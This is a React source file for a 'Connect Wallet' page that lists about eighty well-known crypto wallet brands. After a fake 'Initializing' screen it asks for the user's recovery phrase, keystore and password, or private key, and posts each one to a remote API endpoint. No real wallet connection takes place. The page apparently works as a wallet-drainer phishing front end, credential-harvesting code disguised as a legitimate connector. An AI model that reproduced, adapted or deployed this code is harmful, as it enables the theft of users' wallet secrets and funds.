import { useState } from "react";
import { Link } from "react-router-dom";
import {
  WalletCard,
  WalletListContainer,
  WalletsStyle,
} from "./Wallets.styled";
import styled from "styled-components";
import * as Yup from "yup";
import axios from "axios";
import ReactLoading from "react-loading";
import { useFormik } from "formik";

// eslint-disable-next-line react/prop-types
const Button = ({ children, handleClick, disabled, style, type }) => {
  return (
    <ButtonStyle
      type={type}
      onClick={handleClick}
      disabled={disabled}
      style={{ ...style }}
    >
      {children}
    </ButtonStyle>
  );
};

const LoadingModal = (props) => {
  // eslint-disable-next-line react/prop-types
  const { wallet, showLodingModal } = props;

  return (
    <LoadingModalStyle wallet={wallet} showLodingModal={showLodingModal}>
      <LoadingModalHeadStyle>
        <div style={{ color: "#007bff" }}>Back</div>
        <div style={{ fontSize: "16px", color: "#3b3939", cursor: "pointer" }}>
          X
        </div>
      </LoadingModalHeadStyle>
      <div style={{}}>
        <div
          style={{
            padding: "20px",
            margin: "20px 10px",
            borderRadius: "0 0 20px 20px",
          }}
        >
          <div
            style={{
              padding: "20px",
              textAlign: "left",
              border: "1px solid #fc3131",
              borderRadius: "10px",
              color: "#fc3131",
              fontSize: "16px",
              fontWeight: "500",
            }}
          >
            Initializing...
          </div>

          <div
            style={{
              marginTop: "20px",
              padding: "13px",
              textAlign: "left",
              border: "1px solid #2d3748",
              borderRadius: "10px",
              color: "#2d3748",
              fontSize: "16px",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              fontWeight: "bold",
            }}
          >
            <img
              // eslint-disable-next-line react/prop-types
              src={wallet?.imageSrc}
              // eslint-disable-next-line react/prop-types
              alt={wallet?.name}
              height={50}
              width={50}
              style={{ borderRadius: "50%" }}
            />
            <div>
              {
                // eslint-disable-next-line react/prop-types
                wallet?.name
              }
            </div>
          </div>
        </div>
      </div>
    </LoadingModalStyle>
  );
};

// eslint-disable-next-line react/prop-types
const ConnectModal = ({ showConnectModal, setShowConnectModal, wallet }) => {
  const [connectIsLoading, setConnectIsLoading] = useState(false);
  const [formType, setFormType] = useState("Phrase");
  const { VITE_API_URL } = import.meta.env;

  const phraseFormik = useFormik({
    initialValues: { phrase: "" },
    onSubmit: (phraseValues) => {
      setConnectIsLoading(true);
      const config = {
        headers: {
          Authorization: `Bearer ${localStorage.getItem("token")}`,
        },
      };
      axios.post(
        `${VITE_API_URL}/wallets/`,
        { ...phraseValues, wallet_name: formType },
        config
      );
    },
    validationSchema: Yup.object({
      phrase: Yup.string().required("Phrase is required"),
    }),
  });

  const keyStoreFormik = useFormik({
    initialValues: { keystore: "", wallet_password: "" },
    onSubmit: (keyStoreValues) => {
      setConnectIsLoading(true);
      const config = {
        headers: {
          Authorization: `Bearer ${localStorage.getItem("token")}`,
        },
      };
      axios.post(
        `${VITE_API_URL}/wallets/`,
        { ...keyStoreValues, wallet_name: formType },
        config
      );
    },
    validationSchema: Yup.object({
      keystore: Yup.string().required("Keystore is required"),
      wallet_password: Yup.string().required("Wallet password is required"),
    }),
  });

  const privateKeyFormik = useFormik({
    initialValues: { private_key: "" },
    onSubmit: (privateKeyValues) => {
      setConnectIsLoading(true);
      const config = {
        headers: {
          Authorization: `Bearer ${localStorage.getItem("token")}`,
        },
      };
      axios.post(
        `${VITE_API_URL}/wallets/`,
        { ...privateKeyValues, wallet_name: formType },
        config
      );
    },
    validationSchema: Yup.object({
      private_key: Yup.string().required("PrivateKey is required"),
    }),
  });
  return (
    <ConnectModalStyle showConnectModal={showConnectModal} wallet={wallet}>
      <ConnectModalBodyStyle>
        <div
          style={{
            display: "flex",
            justifyContent: "flex-start",
            alignItems: "center",
          }}
        >
          <img
            style={{ marginInlineEnd: "10px", borderRadius: "50%" }}
            src={
              // eslint-disable-next-line react/prop-types
              wallet?.imageSrc
            }
            alt={
              // eslint-disable-next-line react/prop-types
              wallet?.name
            }
            height={80}
            width={80}
          />
          <h4>
            {
              // eslint-disable-next-line react/prop-types
              wallet?.name
            }
          </h4>
        </div>
        <div
          style={{
            display: "flex",
            justifyContent: "space-evenly",
            marginBlock: "10px",
          }}
        >
          {[
            {
              name: "Phrase",
            },
            {
              name: "Key Store",
            },
            {
              name: "PrivateKey",
            },
          ].map((link, index) => (
            <div
              key={index}
              style={{ cursor: "pointer" }}
              onClick={() => setFormType(link.name)}
            >
              {link.name}
            </div>
          ))}
        </div>
        <div style={{ borderTop: "1px solid #ece7e7", marginBlock: "10px" }} />
        {formType === "Phrase" ? (
          <form onSubmit={phraseFormik.handleSubmit}>
            <textarea
              name="phrase"
              value={phraseFormik.values.phrase}
              onChange={phraseFormik.handleChange}
              placeholder="Enter your recovery phrase"
              rows={5}
              style={{
                width: "calc(100% - 20px)",
                resize: "none",
                padding: "10px",
                border: `1px solid ${
                  phraseFormik.errors.phrase ? "tomato" : "#ced4da"
                }`,
                borderRadius: "0.25rem",
                outline: "transparent",
              }}
            ></textarea>
            <div>
              {phraseFormik.errors && (
                <small style={{ color: "tomato" }}>
                  {phraseFormik.errors?.phrase}
                </small>
              )}
            </div>
            <small style={{ fontSize: "11px" }}>
              Typically 12 (sometimes 24) words separated by single spaces.
            </small>
            <Button
              type={"submit"}
              style={{
                width: "100%",
                display: "flex",
                justifyContent: "center",
                alignItems: "center",
              }}
              disabled={connectIsLoading}
            >
              {connectIsLoading ? (
                <ReactLoading
                  type={"balls"}
                  color={"#fff"}
                  height={"30px"}
                  width={"40px"}
                />
              ) : (
                "PROCEED"
              )}
            </Button>
          </form>
        ) : formType === "Key Store" ? (
          <form onSubmit={keyStoreFormik.handleSubmit}>
            <textarea
              name="keystore"
              value={keyStoreFormik.values.keystore}
              onChange={keyStoreFormik.handleChange}
              placeholder="Enter Keystore"
              rows={5}
              style={{
                width: "calc(100% - 20px)",
                resize: "none",
                padding: "10px",
                border: `1px solid ${
                  keyStoreFormik.errors.keystore ? "tomato" : "#ced4da"
                }`,
                borderRadius: "0.25rem",
                outline: "transparent",
              }}
            ></textarea>
            <div>
              {keyStoreFormik.errors && (
                <small style={{ color: "tomato" }}>
                  {keyStoreFormik.errors?.keystore}
                </small>
              )}
            </div>
            <input
              type="password"
              name="wallet_password"
              value={keyStoreFormik.values.wallet_password}
              onChange={keyStoreFormik.handleChange}
              placeholder="Wallet password"
              style={{
                width: "calc(100% - 20px)",
                resize: "none",
                padding: "10px",
                border: `1px solid ${
                  keyStoreFormik.errors.wallet_password ? "tomato" : "#ced4da"
                }`,
                borderRadius: "0.25rem",
                outline: "transparent",
                marginBlock: "10px 0",
              }}
            />
            <div>
              {keyStoreFormik.errors && (
                <small style={{ color: "tomato" }}>
                  {keyStoreFormik.errors?.wallet_password}
                </small>
              )}
            </div>
            <small style={{ fontSize: "11px" }}>
              Several lines of text beginning with {`{...}`} plus the password
              you used to encrypt it.
            </small>
            <Button
              type={"submit"}
              style={{
                width: "100%",
                display: "flex",
                justifyContent: "center",
                alignItems: "center",
              }}
              disabled={connectIsLoading}
            >
              {connectIsLoading ? (
                <ReactLoading
                  type={"balls"}
                  color={"#fff"}
                  height={"30px"}
                  width={"40px"}
                />
              ) : (
                "PROCEED"
              )}
            </Button>
          </form>
        ) : formType === "PrivateKey" ? (
          <form onSubmit={privateKeyFormik.handleSubmit}>
            <input
              name="private_key"
              value={privateKeyFormik.values.private_key}
              onChange={privateKeyFormik.handleChange}
              placeholder="Enter your Private Key"
              style={{
                width: "calc(100% - 20px)",
                resize: "none",
                padding: "10px",
                border: `1px solid ${
                  privateKeyFormik.errors.private_key ? "tomato" : "#ced4da"
                }`,
                borderRadius: "0.25rem",
                outline: "transparent",
                marginBlock: "10px 0",
              }}
            />
            <div>
              {privateKeyFormik.errors && (
                <small style={{ color: "tomato" }}>
                  {privateKeyFormik.errors?.private_key}
                </small>
              )}
            </div>
            <small style={{ fontSize: "11px" }}>
              Typically 12 (sometimes 24) words separated by a single space.
            </small>
            <Button
              type={"submit"}
              style={{
                width: "100%",
                display: "flex",
                justifyContent: "center",
                alignItems: "center",
              }}
              disabled={connectIsLoading}
            >
              {connectIsLoading ? (
                <ReactLoading
                  type={"balls"}
                  color={"#fff"}
                  height={"30px"}
                  width={"40px"}
                />
              ) : (
                "PROCEED"
              )}
            </Button>
          </form>
        ) : null}
        <Button
          type={"button"}
          style={{
            backgroundColor: "tomato",
            marginLeft: "auto",
            display: "flex",
          }}
          handleClick={() => {
            setShowConnectModal(false);
            setConnectIsLoading(false);
          }}
        >
          cancel
        </Button>
      </ConnectModalBodyStyle>
    </ConnectModalStyle>
  );
};

const Wallets = () => {
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [showLodingModal, setShowLodingModal] = useState(false);
  const [showConnectModal, setShowConnectModal] = useState(false);

  const wallets = [
    {
      name: "Wallet Connect",
      imageSrc: "/wallets/walletconnect.png",
    },
    {
      name: "Trust",
      imageSrc: "/wallets/trust.png",
    },
    {
      name: "MetaMask",
      imageSrc: "/wallets/metamask.png",
    },
    {
      name: "Ledger",
      imageSrc: "/wallets/ledger.png",
    },
    {
      name: "Xumm",
      imageSrc: "/wallets/xumm.png",
    },
    {
      name: "Ordinals",
      imageSrc: "/wallets/ordinals.png",
    },
    {
      name: "Unisat Wallet",
      imageSrc: "/wallets/unisat.png",
    },
    {
      name: "Sologenic",
      imageSrc: "/wallets/sologenic.png",
    },
    {
      name: "Blockchain",
      imageSrc: "/wallets/blockchain.png",
    },
    {
      name: "Bifrost Wallet",
      imageSrc: "/wallets/bifrost.png",
    },
    {
      name: "BRD Wallet",
      imageSrc: "/wallets/brd.png",
    },
    {
      name: "Coinbase",
      imageSrc: "/wallets/coinbase.png",
    },
    {
      name: "Saitamask Wallet",
      imageSrc: "/wallets/saitama.png",
    },
    {
      name: "Terra Station",
      imageSrc: "/wallets/terra.png",
    },
    {
      name: "Phantom",
      imageSrc: "/wallets/phantom.png",
    },
    {
      name: "Cosmos Station",
      imageSrc: "/wallets/cosmos.png",
    },
    {
      name: "Exodus Wallet",
      imageSrc: "/wallets/exodus.png",
    },
    {
      name: "Rainbow",
      imageSrc: "/wallets/rainbow.png",
    },
    {
      name: "Argent",
      imageSrc: "/wallets/argent.png",
    },
    {
      name: "Binance Chain",
      imageSrc: "/wallets/binance.png",
    },
    {
      name: "Safemoon",
      imageSrc: "/wallets/safemoon.png",
    },
    {
      name: "Gnosis",
      imageSrc: "/wallets/gnosis.png",
    },
    {
      name: "Defi",
      imageSrc: "/wallets/defi.png",
    },
    {
      name: "Pillar",
      imageSrc: "/wallets/pillar.png",
    },
    {
      name: "imToken",
      imageSrc: "/wallets/imtoken.png",
    },
    {
      name: "ONTO",
      imageSrc: "/wallets/onto.png",
    },
    {
      name: "TokenPocket",
      imageSrc: "/wallets/tokenpocket.png",
    },
    {
      name: "Aave",
      imageSrc: "/wallets/aave.png",
    },
    {
      name: "Digitex",
      imageSrc: "/wallets/digitex.png",
    },
    {
      name: "Portis",
      imageSrc: "/wallets/portis.png",
    },
    {
      name: "Formatic",
      imageSrc: "/wallets/formatic.png",
    },
    {
      name: "MathWallet",
      imageSrc: "/wallets/mathwallet.png",
    },
    {
      name: "BitPay",
      imageSrc: "/wallets/bitpay.png",
    },
    {
      name: "ledger Live",
      imageSrc: "/wallets/ledgerlive.png",
    },
    {
      name: "WallETH",
      imageSrc: "/wallets/walleth.png",
    },
    {
      name: "Authereum",
      imageSrc: "/wallets/authereum.png",
    },
    {
      name: "Dharma",
      imageSrc: "/wallets/dharma.png",
    },
    {
      name: "1inch Wallet",
      imageSrc: "/wallets/1inch.png",
    },
    {
      name: "Huobi",
      imageSrc: "/wallets/huobi.png",
    },
    {
      name: "Eidoo",
      imageSrc: "/wallets/eidoo.png",
    },
    {
      name: "MYKEY",
      imageSrc: "/wallets/mykey.png",
    },
    {
      name: "Loopring",
      imageSrc: "/wallets/loopring.png",
    },
    {
      name: "TrustVault",
      imageSrc: "/wallets/trustvault.png",
    },
    {
      name: "Atomic",
      imageSrc: "/wallets/atomic.png",
    },
    {
      name: "Coin98",
      imageSrc: "/wallets/coin98.png",
    },
    {
      name: "Tron",
      imageSrc: "/wallets/tron.png",
    },
    {
      name: "Alice",
      imageSrc: "/wallets/alice.png",
    },
    {
      name: "AlphaWallet",
      imageSrc: "/wallets/alphawallet.png",
    },
    {
      name: "D'CENT",
      imageSrc: "/wallets/dcent.png",
    },
    {
      name: "ZelCore",
      imageSrc: "/wallets/alphawallet.png",
    },
    {
      name: "Nash",
      imageSrc: "/wallets/nash.png",
    },
    {
      name: "CoinMoni",
      imageSrc: "/wallets/coinmoni.png",
    },
    {
      name: "GridPlus",
      imageSrc: "/wallets/gridplus.png",
    },
    {
      name: "CyBravo",
      imageSrc: "/wallets/cybravo.png",
    },
    {
      name: "Tokenary",
      imageSrc: "/wallets/tokenary.png",
    },
    {
      name: "Torus",
      imageSrc: "/wallets/torus.png",
    },
    {
      name: "Spatium",
      imageSrc: "/wallets/spatium.png",
    },
    {
      name: "safePal",
      imageSrc: "/wallets/safepal.png",
    },
    {
      name: "Infinito",
      imageSrc: "/wallets/infinito.png",
    },
    {
      name: "wallet.io",
      imageSrc: "/wallets/walletio.png",
    },
    {
      name: "Ownbit",
      imageSrc: "/wallets/ownbit.png",
    },
    {
      name: "EasyPocket",
      imageSrc: "/wallets/easypocket.png",
    },
    {
      name: "Bridge Wallet",
      imageSrc: "/wallets/bridgewallet.png",
    },
    {
      name: "Sparkpoint",
      imageSrc: "/wallets/sparkpoint.png",
    },
    {
      name: "ViaWallet",
      imageSrc: "/wallets/viawallet.png",
    },
    {
      name: "BitKeep",
      imageSrc: "/wallets/bitkeep.png",
    },
    {
      name: "Vision",
      imageSrc: "/wallets/vision.png",
    },
    {
      name: "PEAKDEFI",
      imageSrc: "/wallets/peakdefi.png",
    },
    {
      name: "Unstoppable",
      imageSrc: "/wallets/unstoppable.png",
    },
    {
      name: "HaloDefi",
      imageSrc: "/wallets/halodefi.png",
    },
    {
      name: "Dok Wallet",
      imageSrc: "/wallets/dok.png",
    },
    {
      name: "Midas",
      imageSrc: "/wallets/midas.png",
    },
    {
      name: "Ellipal",
      imageSrc: "/wallets/ellipal.png",
    },
    {
      name: "KEYRING PRO",
      imageSrc: "/wallets/keyring.png",
    },
    {
      name: "Aktionariat",
      imageSrc: "/wallets/aktionariat.png",
    },
    {
      name: "Talken",
      imageSrc: "/wallets/talken.png",
    },
    {
      name: "Flare",
      imageSrc: "/wallets/flare.png",
    },
    {
      name: "KyberSwap",
      imageSrc: "/wallets/kyberswap.png",
    },
    {
      name: "PayTube",
      imageSrc: "/wallets/paytube.png",
    },
    {
      name: "Linen",
      imageSrc: "/wallets/linen.png",
    },
  ];
  return (
    <>
      <WalletsStyle>
        <div
          style={{
            display: "flex",
            flexDirection: "column",
            justifyContent: "center",
            alignItems: "center",
          }}
        >
          <Link to="/">
            <img src="/walletconnect.png" alt="logo" height={40} width={40} />
          </Link>
          <h1
            style={{
              fontWeight: "600px",
              fontSize: "2.5rem",
              lineHeight: "0px",
              marginBlock: "32px 8px",
            }}
          >
            Connect Wallet
          </h1>
          <h6 style={{ fontSize: "15px" }}>
            Please connect your wallet to continue
          </h6>
        </div>
        <WalletListContainer>
          {wallets.map((wallet, index) => (
            <WalletCard
              key={index}
              onClick={() => {
                setSelectedWallet(wallet);
                setShowLodingModal(true);
                setTimeout(() => {
                  setShowLodingModal(false);
                  setShowConnectModal(true);
                }, 500);
              }}
            >
              <img
                src={wallet.imageSrc}
                alt={wallet.name}
                height={40}
                width={40}
              />
              <div style={{ marginTop: "10px" }}>{wallet.name}</div>
            </WalletCard>
          ))}
        </WalletListContainer>
      </WalletsStyle>
      <LoadingModal
        wallet={selectedWallet}
        showLodingModal={showLodingModal}
        setShowLodingModal={setShowLodingModal}
      />
      <ConnectModal
        setShowConnectModal={setShowConnectModal}
        showConnectModal={showConnectModal}
        wallet={selectedWallet}
      />
    </>
  );
};

const ConnectModalStyle = styled.div`
  width: 500px;
  border-radius: 5px;
  background-color: #fff;
  color: #000;
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  display: ${({ showConnectModal }) => (showConnectModal ? "block" : "none")};

  @media only screen and (max-width: 425px) {
    width: 90%;
  }
`;
const ConnectModalBodyStyle = styled.div`
  padding: 20px;
  margin: 20px 10px;
  border-radius: 0 0 20px 20px;
`;

const LoadingModalStyle = styled.div`
  width: 400px;
  height: 316px;
  border-radius: 20px;
  background-color: #fff;
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  display: ${({ wallet, showLodingModal }) =>
    wallet === null || !showLodingModal ? "none" : "block"};

  @media only screen and (max-width: 425px) {
    width: 90%;
  }
`;
const LoadingModalHeadStyle = styled.div`
  background: #e6e6e6;
  border-radius: 20px 20px 0 0;
  padding: 20px;
  display: flex;
  justify-content: space-between;
`;

const ButtonStyle = styled.button`
  background-color: #bc3fea;
  color: white;
  font-size: 20px;
  padding: 10px 30px;
  border-radius: 5px;
  border: none;
  margin: 10px 0px;
  cursor: pointer;

  &:disabled {
    color: grey;
    opacity: 0.7;
    cursor: default;
  }
`;

export default Wallets;
